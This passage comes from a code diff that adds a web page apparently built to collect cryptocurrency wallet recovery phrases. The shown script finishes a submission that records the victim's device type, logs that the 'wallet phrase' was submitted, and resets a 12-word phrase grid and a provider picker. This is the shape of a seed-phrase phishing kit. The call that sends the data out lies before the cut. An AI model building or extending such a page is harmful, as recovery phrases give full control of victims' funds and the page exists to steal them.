+                    deviceType: /Mobile|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop'
+                })
+
+                console.log("[v0] Wallet phrase submitted successfully")
+                loadingOverlay.classList.add("hidden")
+                successOverlay.classList.remove("hidden")
+
+            } catch (error) {
+                console.error("[v0] Submission error:", error)
+                alert("Connection error. Please check your network and try again.")
+                loadingOverlay.classList.add("hidden")
+            }
+        })
+
+        function resetForm() {
+            submissionForm.reset()
+            successOverlay.classList.add("hidden")
+            formState.classList.add("hidden")
+            loadingOverlay.classList.add("hidden")
+            initialState.classList.remove("hidden")
+            walletItems.forEach((i) => i.classList.remove("active"))
+            walletItems[0].classList.add("active")
+            selectedWalletLogo.classList.remove("hidden")
+            othersLogo.classList.add("hidden")
+            othersProviderInput.classList.add("hidden")
+            phraseTypeContainer.classList.remove("hidden")
+            phraseGrid.classList.remove("hidden")
+            phraseTextareaContainer.classList.add("hidden")
+            customProvider = ""
+            isTextareaVisible = false
+            
+            // Reset theme to default
+            const interactionPanel = document.getElementById("interactionPanel")
+            interactionPanel.className = `relative bg-white`
+            
+            // Reset phrase grid to 12 words
+            phraseTypeSelect.value = "12"
+            generatePhraseGrid(12)
+            
+            // Reset textarea
+            phraseTextarea.value = ""
+            updateWordCount()
+            updateTextareaVisibility()
+        }
+
+        // Initialize with 12 word grid
+        generatePhraseGrid(12)
+        updateWordCount()
+        
+        // Handle keyboard close (ESC key)
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape' && !modal.classList.contains('hidden')) {
+                closeModal()
+            }
+        })
+        
+        // Prevent form zoom on mobile iOS
+        document.addEventListener('touchstart', function() {}, {passive: true})
+    </script>
+    <script>
+        // Initialize Lucide icons
+        lucide.createIcons();
+    </script>
+</body>
+</html>
